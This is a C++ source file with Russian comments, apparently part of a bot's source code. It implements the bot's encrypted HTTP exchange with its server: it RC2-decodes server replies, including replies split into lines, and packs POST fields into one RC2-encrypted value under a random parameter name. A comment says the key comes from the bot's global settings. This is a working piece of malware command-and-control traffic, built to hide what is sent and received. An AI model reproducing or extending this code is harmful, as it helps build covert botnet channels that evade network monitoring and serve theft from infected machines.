//---------------------------------------------------------------------------

#include "BotCryptHTTP.h"

#include "GetApi.h"
#include "Crypt.h"
#include "Utils.h"
//---------------------------------------------------------------------------




//****************************************************************************
//  CryptHTTP -  методы шифрованного обмена с HTTP сервером
//****************************************************************************

//---------------------------------------------------------------------------
PCHAR PrepareHTTPBuffer(PCHAR Buf)
{
	// Функция отсекает лишние символы от зашифрованного буфера
	if (STR::IsEmpty(Buf))
		return NULL;

	PCHAR S = Buf;

	// Отсекаем стартовые символы
//	while (*S != 0 && (*S == ' ' || *S == 10 || *S == 13)) S++;

	// Отсекаем конечные символы
	PCHAR E = STR::End(S);

	while (E > S)
	{
		if (*E == ' ' || *E == 10 || *E == 13)
			*E = 0;
		else
			break;
		E--;
	}
	return S;
}

//---------------------------------------------------------------------------

bool HTTPBufferContainsLineBreaks(PCHAR Buf)
{
	// Функция возвращает истину если строка содержит символы перевода 10? 13
	if (Buf == NULL) return false;

	for (; *Buf != 0; Buf++)
	{
		if (*Buf == 10 || *Buf == 13)
            return true;
	}

    return false;
}


PCHAR DecodeHTTPBuffer(PCHAR InBuffer, PCHAR Password)
{

	// Функция декодирует зашифрованный текст, полученный в результате
	// HTTP запроса. Нюанс в том, что некоторые скрипты могут возвращать
	// текст не как один буфер а как несколько отдельно зашифрованных
	// строк, разделённых переводами строки

	PCHAR Buf = PrepareHTTPBuffer(InBuffer);
	if (Buf == NULL)
		return NULL;

	// Если строка не содержит символов перевода то просто декодируем буфер
	if (!HTTPBufferContainsLineBreaks(Buf))
	{
		RC2Crypt::DecodeStr(Password, Buf);
		return Buf;
    }



	PStrings Source = Strings::Create();
    PStrings Dest   = Strings::Create();


	// Раскладываем текст по строкам и декодируем каждую строку отдельно
	Strings::SetText(Source, Buf);

	for (DWORD i = 0; i < Strings::Count(Source) - 1; i++)
    {
		PCHAR Str = Strings::GetItem(Source, i, false);
		if (STR::IsEmpty(Str))
			continue;

		// Декодируем строку
		RC2Crypt::DecodeStr(Password, Str);
		Strings::Add(Dest, Str);
	}


    PCHAR Result = Strings::GetText(Dest);

	Strings::Free(Source);
	Strings::Free(Dest);

	return Result;

}
//---------------------------------------------------------------------------

// Загрузить шифрованный документ
bool CryptHTTP::Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer)
{
	if (STR::IsEmpty(URL))
		return false;
	bool Result = HTTP::Get(URL, Buf, Response);

	// Расшифровываем данные
	if (Result && !STR::IsEmpty(Password) && Buf != NULL)
	{
        *Buf = DecodeHTTPBuffer(*Buf, Password);
	}

	return Result;
}

//---------------------------------------------------------------------------

bool CryptHTTP::Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer)
{
	// Функция отправляет зашифрованные пост данные на указанный
	// адрес. ключ берётся из глобальных настроек бота
	if (STR::IsEmpty(URL) || Fields == NULL)
		return false;

	// Запаковываем и зашифровываем данные
	if (Password != NULL)
	{
		PCHAR Text = Strings::GetText(Fields, URLValueDelimeter);
		Strings::Clear(Fields);

		PCHAR Name = Random::RandomString(Random::Generate(3, 6), 'a', 'z');

		PCHAR Value = RC2Crypt::Encode((LPBYTE)Text, STR::Length(Text), Password);

		AddURLParam(Fields, Name, Value);

		STR::Free(Text);
		STR::Free(Name);
		STR::Free(Value);
    }

    bool Result = HTTP::Post(URL, Fields, Buf, Response);

	if (Result && !STR::IsEmpty(Password) && Buf != NULL)
	{
		*Buf = DecodeHTTPBuffer(*Buf, Password);
    }

	return Result;
}
